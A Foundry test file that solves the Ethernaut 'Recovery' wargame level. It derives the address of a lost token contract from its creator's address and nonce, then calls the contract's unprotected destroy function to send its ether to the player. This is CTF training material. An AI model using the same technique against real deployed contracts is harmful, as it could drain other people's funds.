pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Recovery } from "src/Recovery/Recovery.sol";
import { RecoveryFactory } from "src/Recovery/RecoveryFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testRecoveryHack() external {
        // level setup
        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 1 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        Recovery recovery = Recovery(payable(levelAddress));

        // attack
        address lostAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recovery), bytes1(0x01)))))
        );
        (bool success,) = lostAddress.call(abi.encodeWithSignature("destroy(address)", me));
        require(success);

        changePrank(me);
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
